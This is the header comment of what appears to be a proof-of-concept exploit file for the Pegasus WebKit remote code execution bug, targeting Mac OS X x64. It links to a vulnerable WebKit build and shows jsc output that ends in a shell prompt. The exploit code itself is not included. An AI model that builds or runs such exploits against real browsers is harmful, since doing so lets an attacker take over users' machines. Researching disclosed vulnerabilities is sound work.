...
Pegasus WebKit RCE (fixed in iOS 9.3.5)
Exploit targets Mac OS X x64. Other platforms should be similar, no hardcoded offsets.
Vuln WebKit (random release, not actually last vuln): https://builds-nightly.webkit.org/files/trunk/mac/WebKit-SVN-r200103.dmg
by qwertyoruiop[kjc], thanks to chen liang & lookout
never tested against actual browser just jsc because lazy

output:

$ /Volumes/WebKit/WebKit.app/Contents/Frameworks/10-11/JavaScriptCore.framework/Versions/A/Resources/jsc yolo.js
aye
win!
sh-3.2$ 

--!>
*/ //<script>var print = alert;
